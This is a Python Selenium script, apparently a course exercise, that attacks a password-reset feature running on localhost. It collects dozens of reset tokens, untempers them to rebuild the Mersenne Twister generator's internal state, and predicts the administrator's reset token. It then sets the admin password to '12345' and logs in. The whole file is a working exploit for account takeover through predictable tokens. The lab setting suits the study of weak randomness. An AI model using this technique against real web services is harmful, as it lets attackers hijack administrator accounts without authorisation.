# Import the require libraries
from selenium import webdriver
from selenium.webdriver.common.by import By
from tools import *
import time
from untemper import *
from task2 import *


"""
Name : Brian Kwong and Trycia Vong
"""

USERNAME = "example_usernam2e"
PASSWORD = "example_password"
BASE_PASSWORD_RESET_URL = "http://localhost:8080/reset?token="


def tokenSeparator(input: str) -> list[int]:
    token = base64_to_ascii(input)
    return token.decode().split(":")


def combineTokens(tokens: list[int]) -> bytes:
    joined_tokens = ":".join(tokens).encode()
    print(joined_tokens)
    return ascii_to_base64(joined_tokens)


# Init the chrome web driver
driver = webdriver.Chrome()
driver.get("http://localhost:8080/")

# Make a new account
register_link = driver.find_element(By.LINK_TEXT, "Register")
register_link.click()

# Enter in the username
username_input = driver.find_element(By.ID, "user")
username_input.send_keys(USERNAME)

# Enter in the password
password_input = driver.find_element(By.ID, "password")
password_input.send_keys(PASSWORD)

# Submit the form
regsiter_button = driver.find_element(By.ID, "Register")
regsiter_button.click()

home_link = driver.find_element(By.LINK_TEXT, "Return")
home_link.click()


reset_password_link = driver.find_element(By.LINK_TEXT, "Forgot Password?")
reset_password_link.click()

token_list = []

for i in range(78):
    # Enter in the username
    username_input = driver.find_element(By.ID, "forgotUser")
    username_input.send_keys(USERNAME)
    reset_button = driver.find_element(By.ID, "Reset")
    reset_button.submit()
    username_input = driver.find_element(By.ID, "forgotUser")
    username_input.clear()
    token = driver.find_element(By.XPATH, "/html/body/div[3]/center/form/p")
    token_list += tokenSeparator(token.text.split("token=")[1])
    time.sleep(0.3)
token_list = list(map(lambda x: untemper_number(int(x)), token_list))
generator = MT19937(b"0")
generator.mt = token_list
generator.index = generator.n
generated_numbers = []
for i in range(8):
    generated_numbers.append(generator.extract_number())
generated_numbers = list(map(lambda x: str(x), generated_numbers))


# Input the admin as the username and rest their password
username_input = driver.find_element(By.ID, "forgotUser")
username_input.clear()
username_input.send_keys("admin")
reset_button = driver.find_element(By.ID, "Reset")
reset_button.submit()

# Generate the reset link

reset_link = BASE_PASSWORD_RESET_URL + combineTokens(generated_numbers)

# Go to that reset link

driver.get(reset_link)


# Provide a new password

password_input = driver.find_element(By.ID, "password")
password_input.send_keys("12345")
reset_button = driver.find_element(By.ID, "Reset Password")
reset_button.click()

# Login

# Goes to the login page
driver.get("http://localhost:8080/")
username_input = driver.find_element(By.ID, "usernameBox")
username_input.send_keys("admin")
password_input = driver.find_element(By.ID, "passwordBox")
password_input.send_keys("12345")
login_button = driver.find_element(By.ID, "loginButton")
login_button.click()

# Waits for the user to press enter and close the browser
input("Press Enter to continue...")
